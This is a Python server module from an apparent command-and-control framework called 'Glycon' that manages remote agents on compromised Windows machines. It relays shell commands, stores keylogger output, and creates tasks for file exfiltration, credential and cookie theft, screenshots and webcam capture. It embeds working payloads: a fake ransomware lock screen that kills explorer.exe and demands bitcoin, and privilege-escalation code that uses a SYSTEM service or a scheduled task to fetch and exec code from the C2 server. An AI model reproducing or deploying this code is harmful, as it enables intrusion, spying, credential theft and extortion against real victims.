from flask import request
from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json
import os
import logging
from glycon.secure_comms import SecureComms
import base64

# Suppress SocketIO packet logs
logging.getLogger('socketio').setLevel(logging.CRITICAL)
logging.getLogger('engineio').setLevel(logging.CRITICAL)
logging.getLogger('socketio.server').setLevel(logging.CRITICAL)
logging.getLogger('engineio.server').setLevel(logging.CRITICAL)

def init_socket_handlers(socketio):
    active_agents = {}
    keylogger_active_agents = {}  # Track agents with keylogger started
    remote_desktop_active_agents = {}  # Track agents with remote desktop started
    connection_count = 0

    # Ensure keylogs table exists
    conn = sqlite3.connect(CONFIG.database)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            keys TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

    @socketio.on('join_terminal', namespace='/terminal')
    def handle_join_terminal(data):
        if current_user.is_authenticated:
            join_room(f"terminal_{data['agent_id']}")
            print(f"[SocketIO] Terminal UI joined room for agent {data['agent_id']}")
            # Check if agent is already connected and emit status
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
            result = c.fetchone()
            conn.close()

            if result and result[0] == 1:
                emit('status', {
                    'status': 'connected',
                    'agent_id': data['agent_id']
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
                print(f"[SocketIO] Agent {data['agent_id']} already connected, sent status update")

    @socketio.on('ws_control', namespace='/terminal')
    def handle_ws_control(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            action = data.get('action')
            if not agent_id or action not in ['start', 'stop']:
                return

            if action == 'stop':
                # Remove agent from active_agents
                active_agents.pop(agent_id, None)

                # Update database
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                # Emit disconnect events
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                print(f"[SocketIO] WebSocket stopped for agent {agent_id}")

    @socketio.on('disconnect', namespace='/terminal')
    def handle_terminal_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

        # Emit stop_keep_alive to all agents when terminal disconnects
        for agent_id in active_agents:
            emit('stop_keep_alive', {}, room=f"agent_{agent_id}", namespace='/terminal')
            print(f"[SocketIO] Sent stop_keep_alive to agent {agent_id}")

    @socketio.on('agent_connect', namespace='/terminal')
    def handle_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Authentication failed: Invalid token")
                return False
            
            join_room(f"agent_{data['agent_id']}", namespace='/terminal')
            active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Agent authenticated. Total connections: {connection_count}")
            print(f"[SocketIO] Current active_agents: {list(active_agents.keys())}")
            
            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()
            
            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            print(f"[SocketIO] Agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            return False

    @socketio.on('disconnect', namespace='/terminal')
    def handle_agent_disconnect():
        nonlocal connection_count
        # Remove agent from active_agents on disconnect
        rooms = socketio.server.manager.rooms.get('/terminal', {})
        disconnected_agents = []
        for agent_id in list(active_agents.keys()):
            if f"agent_{agent_id}" not in rooms:
                disconnected_agents.append(agent_id)
                active_agents.pop(agent_id, None)
                keylogger_active_agents.pop(agent_id, None)
                connection_count -= 1
                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
                print(f"[SocketIO] Current active_agents after disconnect: {list(active_agents.keys())}")
                
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                # Tell the agent to stop sending keep-alive pings
                emit('stop_keep_alive', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/terminal')
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

    @socketio.on('keep_alive', namespace='/terminal')
    def handle_keep_alive(data):
        # Simply acknowledge the keep_alive ping to keep connection alive
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            print(f"[SocketIO] Received keep_alive ping from agent {agent_id}")
            emit('keep_alive_ack', {'status': 'success'}, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('execute_command', namespace='/terminal')
    def handle_execute_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            command = data.get('command')
            if not agent_id or not command:
                print("[SocketIO] execute_command event missing agent_id or command")
                return
            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command}")
            # Forward the command to the agent's room
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command', namespace='/terminal')
    def handle_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            command = data.get('command', '').strip()
            current_dir = data.get('current_dir')
            
            if not agent_id or not command:
                return

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Handle # shortcuts
            if command.startswith('#'):
                parts = command[1:].split(' ', 1)
                cmd_type = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ''

                if cmd_type == 'help':
                    help_text = (
                        "\r\nGlycon Terminal Shortcuts:\r\n"
                        "  #help              - Show this help\r\n"
                        "  #upload            - Open file upload dialog\r\n"
                        "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
                        "  #screenshot        - Take a screenshot\r\n"
                        "  #webshot           - Take a webcam capture\r\n"
                        "  #creds             - Harvest credentials, history, and WiFi\r\n"
                        "  #cookies           - Steal browser cookies\r\n"
                        "  #keylogger         - Start keylogger\r\n"
                        "  #nokeylogger       - Stop keylogger\r\n"
                        "  #fakeransom        - Deploys full-screen ransom note and kills explorer.exe\r\n"
                        "  #clearransom       - Closes ransom note and restarts explorer.exe\r\n"
                        "  #getsystem         - Elevate to NT AUTHORITY\\SYSTEM (Requires Admin)\r\n"
                        "  #spawnas <user>    - Spawn agent as specified user (Requires SYSTEM/Admin)\r\n"
                    )
                    emit('terminal_output', {
                        'agent_id': agent_id,
                        'output': help_text,
                        'current_dir': current_dir
                    }, room=f"terminal_{agent_id}")
                    conn.close()
                    return

                # Task Creation Logic
                task_type = None
                task_data = {}

                if cmd_type == 'fakeransom':
                    task_type = 'execute_python'
                    ransom_html = """
<!DOCTYPE html>
<html lang="en" class="notranslate" translate="no">
<head>
    <meta name="google" content="notranslate" />
    <title>FINAL WARNING</title>
    <style>
        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { text-align: center; border: 5px solid #ff0000; padding: 50px; max-width: 80%; background: rgba(20, 0, 0, 0.9); box-shadow: 0 0 50px #ff0000; }
        h1 { font-size: 4em; margin: 0; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        .message { font-size: 1.5em; margin: 20px 0; }
        .timer { font-size: 3em; font-weight: bold; color: #fff; margin: 30px 0; }
        .id { color: #888; font-size: 0.9em; margin-top: 40px; }
        .footer { margin-top: 50px; color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ALL YOUR FILES ARE ENCRYPTED</h1>
        <div class="message">
            Your system has been infected with GLYCON-X Ransomware.<br>
            All documents, photos, databases and other important files have been encrypted using AES-256.<br>
            Any attempt to restore files manually will result in permanent data loss.
        </div>
        <div class="message">TIME REMAINING UNTIL PRIVATE KEY DELETION:</div>
        <div class="timer" id="timer">72:00:00</div>
        <div class="message">PAY 0.5 BTC TO: 1GlyconXvP7V1vE9vM5Z3xP3zT8vN5q4r</div>
        <div class="footer">DO NOT SHUT DOWN OR RESTART YOUR COMPUTER</div>
        <div class="id" id="sysid">SYSTEM ID: </div>
    </div>
    <script>
        function updateTimer() {
            let h = 71, m = 59, s = 59;
            setInterval(() => {
                s--;
                if (s < 0) { s = 59; m--; }
                if (m < 0) { m = 59; h--; }
                document.getElementById('timer').innerText = 
                    (h < 10 ? '0'+h : h) + ":" + (m < 10 ? '0'+m : m) + ":" + (s < 10 ? '0'+s : s);
            }, 1000);
        }
        document.getElementById('sysid').innerText += Math.random().toString(36).substr(2, 9).toUpperCase();
        updateTimer();
    </script>
</body>
</html>
"""
                    python_payload = f"""
import os
import tempfile
import base64
import subprocess
import winreg

def get_browser_path():
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe")
    ]
    for root, key_path in paths:
        try:
            with winreg.OpenKey(root, key_path) as key:
                return winreg.QueryValue(key, None)
        except:
            continue
    
    common = [
        r"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
    ]
    for p in common:
        if os.path.exists(p): return p
    return "msedge.exe"

html_content = {repr(ransom_html)}
temp_dir = tempfile.gettempdir()
html_path = os.path.join(temp_dir, "gl_ransom.html")

with open(html_path, "w", encoding="utf-8") as f:
    f.write(html_content)

# Kill explorer to prevent user from escaping easily
subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

browser_path = get_browser_path()
is_chrome = "chrome.exe" in browser_path.lower()

cmd = [browser_path, "--kiosk", f"file:///{{html_path}}", "--no-first-run", "--no-default-browser-check"]
if not is_chrome:
    cmd.append("--edge-kiosk-type=fullscreen")

subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
result = f"Ransomware screen deployed successfully using {{browser_path}}"
"""
                    task_data = {'code': python_payload}
                elif cmd_type == 'clearransom':
                    task_type = 'execute_python'
                    python_payload = """
import os
import subprocess
import tempfile

# Kill browsers
subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Restart Explorer
subprocess.Popen(["explorer.exe"], start_new_session=True)

# Clean up temporary file
temp_dir = tempfile.gettempdir()
html_path = os.path.join(temp_dir, "gl_ransom.html")
if os.path.exists(html_path):
    try:
        os.remove(html_path)
    except:
        pass

result = "Ransomware screen cleared and Explorer restarted"
"""
                    task_data = {'code': python_payload}
                elif cmd_type == 'screenshot':
                    task_type = 'screenshot'
                elif cmd_type == 'webshot':
                    task_type = 'webcam'
                elif cmd_type == 'creds':
                    task_type = 'harvest_creds'
                elif cmd_type == 'getsystem':
                    # Get the most recent server_url from agent configurations
                    c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
                    row = c.fetchone()
                    server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
                    
                    # Log the URL we found
                    print(f"[#getsystem] Using server_url: {server_url}")
                    
                    # Define the code that will run as SYSTEM
                    python_code = f"import requests;url='{server_url}/a/d';exec(requests.get(url, verify=False).text)"
                    
                    task_type = 'execute_python'
                    # We use repr(python_code) to ensure proper escaping of the inner code string
                    python_payload = f"""
import os, ctypes, subprocess, time, sys
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

if not is_admin():
    result = 'Error: Administrative privileges required for #getsystem'
else:
    service_name = 'GlyconElevator'
    p_code = {repr(python_code)}
    
    # Use pythonw if available to avoid console window
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pyw): pyw = sys.executable

    # Build the command string carefully
    python_cmd = pyw + ' -c "' + p_code + '"'
    
    # Construct sc command. binPath needs to be one single argument for the list-based subprocess.run
    bin_path_val = 'cmd /c ' + '"' + python_cmd + '"'
    create_svc = ['sc', 'create', service_name, 'binPath=', bin_path_val, 'start=', 'demand', 'obj=', 'LocalSystem']
    start_svc = ['sc', 'start', service_name]
    delete_svc = ['sc', 'delete', service_name]
    
    try:
        # 1. Create service
        cp = subprocess.run(create_svc, capture_output=True, text=True)
        if cp.returncode != 0:
            result = f"Error creating service: {{cp.stderr}}"
        else:
            # 2. Start service
            subprocess.run(start_svc, capture_output=True)
            time.sleep(2)
            # 3. Cleanup
            subprocess.run(delete_svc, capture_output=True)
            result = 'Success: NT AUTHORITY/SYSTEM agent spawn command sent.'
    except Exception as e:
        result = f'Error during elevation: {{str(e)}}'
"""
                    task_data = {'code': python_payload.strip()}
                elif cmd_type == 'spawnas' and arg:
                    try:
                        print(f"[DEBUG] spawnas triggered for {arg}")
                        # Get the most recent server_url from agent configurations
                        c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
                        row = c.fetchone()
                        server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
                        
                        target_user = arg
                        
                        # Define the code that will run as the target user
                        python_code = f"import requests;url='{server_url}/a/d';exec(requests.get(url, verify=False).text)"
                        
                        task_type = 'execute_python'
                        python_payload = f"""
import os, ctypes, subprocess, time, sys, base64

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

result = 'Starting spawnas...'
if not is_admin():
    result = 'Error: Administrative privileges required for #spawnas'
else:
    target = {repr(target_user)}
    task_name = 'GlyconSpawn_' + os.urandom(4).hex()
    p_code = {repr(python_code)}
    
    # Base64 encode the payload
    encoded_payload = base64.b64encode(p_code.encode()).decode()
    
    # Write payload to disk momentarily as a .log file
    log_path = 'C:\\\\Users\\\\Public\\\\' + task_name + '.log'
    try:
        with open(log_path, 'w') as f:
            f.write("import base64;exec(base64.b64decode(b'" + encoded_payload + "'))")

        # Use pythonw if available to avoid console window
        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pyw): pyw = sys.executable

        # The /TR syntax expects: "C:\\path\\to\\program.exe" "argument1"
        tr_command = '"' + pyw + '" "' + log_path + '"'
        
        create_task = ['schtasks', '/create', '/tn', task_name, '/tr', tr_command, '/sc', 'once', '/st', '00:00', '/ru', target, '/it', '/f']
        run_task = ['schtasks', '/run', '/tn', task_name]
        delete_task = ['schtasks', '/delete', '/tn', task_name, '/f']
        
        # 1. Create task
        cp = subprocess.run(create_task, capture_output=True, text=True)
        if cp.returncode != 0:
            result = "Error creating task for " + target + ": " + cp.stderr
        else:
            # 2. Run task
            rp = subprocess.run(run_task, capture_output=True, text=True)
            if rp.returncode != 0:
                result = "Error running task for " + target + ": " + rp.stderr
            else:
                time.sleep(2)
                # 3. Cleanup (Disabled for debugging)
                # subprocess.run(delete_task, capture_output=True)
                # try: os.remove(log_path)
                # except: pass
                result = 'Success: Agent spawn command sent for user ' + target + '. (File: ' + log_path + ' left for debugging)'
    except Exception as e:
        result = 'Error during file/task operations: ' + str(e)
"""
                        task_data = {'code': python_payload.strip()}
                    except Exception as server_error:
                        print(f"[ERROR] Server error creating spawnas payload: {str(server_error)}")
                        emit('terminal_output', {
                            'agent_id': agent_id,
                            'output': f"\r\n[!] Server error parsing spawnas payload: {str(server_error)}\r\n",
                            'current_dir': current_dir
                        }, room=f"terminal_{agent_id}")
                        conn.close()
                        return
                elif cmd_type == 'cookies':
                    task_type = 'steal_cookies'
                elif cmd_type == 'keylogger':
                    task_type = 'keylogger'
                    task_data = {'action': 'start'}
                elif cmd_type == 'nokeylogger':
                    task_type = 'keylogger'
                    task_data = {'action': 'stop'}
                elif cmd_type == 'exfiltrate' and arg:
                    task_type = 'upload'
                    # Handle relative path
                    full_path = arg
                    if not (arg.startswith('/') or (len(arg) > 2 and arg[1] == ':')):
                        path_sep = '\\' if '\\' in current_dir or (len(current_dir) > 1 and current_dir[1] == ':') else '/'
                        full_path = f"{current_dir.rstrip(path_sep)}{path_sep}{arg}"
                    task_data = {'path': full_path}
                elif cmd_type == 'upload' and arg:
                    # Find file in uploads directory
                    uploads_dir = os.path.join(os.getcwd(), 'glycon', 'uploads')
                    found_file = None
                    if os.path.exists(uploads_dir):
                        for f in os.listdir(uploads_dir):
                            if f.endswith(f"_{arg}") or f == arg:
                                found_file = f
                                break
                    
                    if found_file:
                        try:
                            with open(os.path.join(uploads_dir, found_file), 'rb') as f:
                                encoded_data = base64.b64encode(f.read()).decode('utf-8')
                            task_type = 'download'
                            task_data = {
                                'filename': arg,
                                'data': encoded_data,
                                'folder': current_dir
                            }
                        except Exception as e:
                            emit('terminal_output', {
                                'agent_id': agent_id,
                                'output': f"\r\n[!] Error reading file: {str(e)}\r\n",
                                'current_dir': current_dir
                            }, room=f"terminal_{agent_id}")
                            conn.close()
                            return
                    else:
                        emit('terminal_output', {
                            'agent_id': agent_id,
                            'output': f"\r\n[!] Error: File '{arg}' not found in C2 uploads directory.\r\n",
                            'current_dir': current_dir
                        }, room=f"terminal_{agent_id}")
                        conn.close()
                        return

                if task_type:
                    c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                            (None, agent_id, task_type, json.dumps(task_data),
                            'pending', datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
                    conn.commit()
                    task_id = c.lastrowid
                    conn.close()

                    emit('terminal_output', {
                        'agent_id': agent_id,
                        'output': f"\r\n[*] Created {task_type} task (ID: {task_id}) via terminal shortcut.\r\n",
                        'current_dir': current_dir
                    }, room=f"terminal_{agent_id}")

                    # Notify agent via the agent room
                    emit('new_task', {
                        'task_id': task_id,
                        'agent_id': agent_id,
                        'task_type': task_type
                    }, room=f"agent_{agent_id}")
                    return
                else:
                    conn.close()
                    emit('terminal_output', {
                        'agent_id': agent_id,
                        'output': f"\r\n[!] Unknown shortcut or missing argument: #{cmd_type}\r\n",
                        'current_dir': current_dir
                    }, room=f"terminal_{agent_id}")
                    return

            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command} with current_dir: {current_dir}")
            # Forward the command to the agent's room as execute_command event
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id,
                'current_dir': current_dir
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('kill_process', namespace='/terminal')
    def handle_kill_process(data):
        """Forward kill process command to agent"""
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            process_id = data.get('process_id')
            if not agent_id:
                print("[SocketIO] kill_process event missing agent_id")
                return
            print(f"[SocketIO] Forwarding kill_process to agent {agent_id}: process_id={process_id}")
            # Forward the kill command to the agent's room
            emit('kill_process', {
                'agent_id': agent_id,
                'process_id': process_id
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command_result', namespace='/terminal')
    def handle_command_result(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] command_result event missing agent_id")
            return
        print(f"[SocketIO] Forwarding command result from agent {agent_id}")
        # Forward the result to the terminal UI room
        emit('terminal_output', data, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('agent_connect', namespace='/keylogger')
    def handle_keylogger_agent_connect(data):
        try:
            print(f"[SocketIO] Keylogger agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Keylogger authentication failed: Invalid token")
                return False

            # Auto-start keylogger when agent connects to keylogger namespace
            if data['agent_id'] not in keylogger_active_agents:
                keylogger_active_agents[data['agent_id']] = True
                print(f"[SocketIO] Auto-starting keylogger for agent {data['agent_id']}")

            join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
            active_agents[data['agent_id']] = True
            print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")

            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            # Emit keylogger_status to confirm it's started
            emit('keylogger_status', {'status': 'started'}, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            return True
        except Exception as e:
            print(f"[SocketIO] Keylogger agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
            return False

    @socketio.on('start_keylogger', namespace='/keylogger')
    def handle_start_keylogger(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] start_keylogger event missing agent_id")
            return
        # Mark keylogger as started for this agent
        keylogger_active_agents[agent_id] = True
        print(f"[SocketIO] Keylogger started on agent {agent_id}")
        emit('keylogger_status', {'status': 'started'}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('keylogger_data', namespace='/keylogger')
    def handle_keylogger_data(data):
        agent_id = data.get('agent_id')
        keys = data.get('keys')
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        if not agent_id or not keys:
            print("[SocketIO] keylogger_data event missing agent_id or keys")
            return
        if agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Unauthorized keylogger_data event received from agent {agent_id}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Keylogger not started'}, room=f"agent_{agent_id}", namespace='/keylogger')
            return
        try:
            print(f"[SocketIO] Saving keylogger data for agent {agent_id}: {keys}")
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("PRAGMA foreign_keys = ON")
            c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
            conn.commit()
            conn.close()
            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except sqlite3.IntegrityError as e:
            print(f"[SocketIO] Database integrity error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Database integrity error'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except Exception as e:
            print(f"[SocketIO] Error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('join', namespace='/keylogger')
    def handle_join(data):
        room = data
        agent_id = None
        if isinstance(data, dict):
            room = data.get('room')
            agent_id = data.get('agent_id')
        if not room:
            print("[SocketIO] join event missing room")
            return
        if agent_id and agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Keylogger join denied: Keylogger not started on agent {agent_id}")
            emit('status', {
                'status': 'error',
                'message': 'Keylogger not started on agent',
                'agent_id': agent_id
            }, room=room, namespace='/keylogger')
            return
        join_room(room, namespace='/keylogger')

    # Remote Desktop SocketIO handlers
    @socketio.on('connect', namespace='/remote_desktop')
    def handle_remote_desktop_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Remote Desktop client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('connect', namespace='/terminal')
    def handle_terminal_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Terminal client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('join_remote_desktop', namespace='/remote_desktop')
    def handle_join_remote_desktop(data):
        if current_user.is_authenticated:
            join_room(f"remote_desktop_{data['agent_id']}")
            print(f"[SocketIO] Remote Desktop UI joined room for agent {data['agent_id']}")
            # Check if agent is already connected and emit status
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT rd_connected FROM agents WHERE id=?", (data['agent_id'],))
            result = c.fetchone()
            conn.close()

            if result and result[0] == 1:
                emit('status', {
                    'status': 'connected',
                    'agent_id': data['agent_id']
                }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
                print(f"[SocketIO] Agent {data['agent_id']} already connected to remote desktop, sent status update")

    @socketio.on('rd_control', namespace='/remote_desktop')
    def handle_rd_control(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            action = data.get('action')
            if not agent_id or action not in ['start', 'stop']:
                return

            if action == 'stop':
                # Remove agent from remote_desktop_active_agents
                remote_desktop_active_agents.pop(agent_id, None)

                # Update database
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                # Emit stop_screenshots to agent to stop immediately
                emit('stop_screenshots', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/remote_desktop')

                # Emit disconnect events
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                emit('rd_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'Remote Desktop disconnected'
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                print(f"[SocketIO] Remote Desktop stopped for agent {agent_id}")

    @socketio.on('disconnect', namespace='/remote_desktop')
    def handle_remote_desktop_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")

        # Clean up all agent connections
        for agent_id in list(remote_desktop_active_agents.keys()):
            try:
                emit('stop_screenshots', {}, room=f"agent_{agent_id}", namespace='/remote_desktop')
                remote_desktop_active_agents.pop(agent_id, None)
                
                # Update database
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                print(f"[SocketIO] Cleaned up agent {agent_id} on remote desktop disconnect")
            except Exception as e:
                print(f"[SocketIO] Error cleaning up agent {agent_id}: {str(e)}")

    @socketio.on('agent_connect', namespace='/remote_desktop')
    def handle_remote_desktop_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Remote Desktop agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Remote Desktop authentication failed: Invalid token")
                return False

            join_room(f"agent_{data['agent_id']}", namespace='/remote_desktop')
            remote_desktop_active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Remote Desktop agent authenticated. Total connections: {connection_count}")
            print(f"[SocketIO] Current remote_desktop_active_agents: {list(remote_desktop_active_agents.keys())}")

            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET rd_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()

            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')

            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')

            print(f"[SocketIO] Remote Desktop agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Remote Desktop agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
            return False

    @socketio.on('disconnect', namespace='/remote_desktop')
    def handle_remote_desktop_agent_disconnect():
        nonlocal connection_count
        # Remove agent from remote_desktop_active_agents on disconnect
        rooms = socketio.server.manager.rooms.get('/remote_desktop', {})
        disconnected_agents = []
        for agent_id in list(remote_desktop_active_agents.keys()):
            if f"agent_{agent_id}" not in rooms:
                disconnected_agents.append(agent_id)
                remote_desktop_active_agents.pop(agent_id, None)
                connection_count -= 1
                print(f"[SocketIO] Remote Desktop agent {agent_id} disconnected and removed from remote_desktop_active_agents")
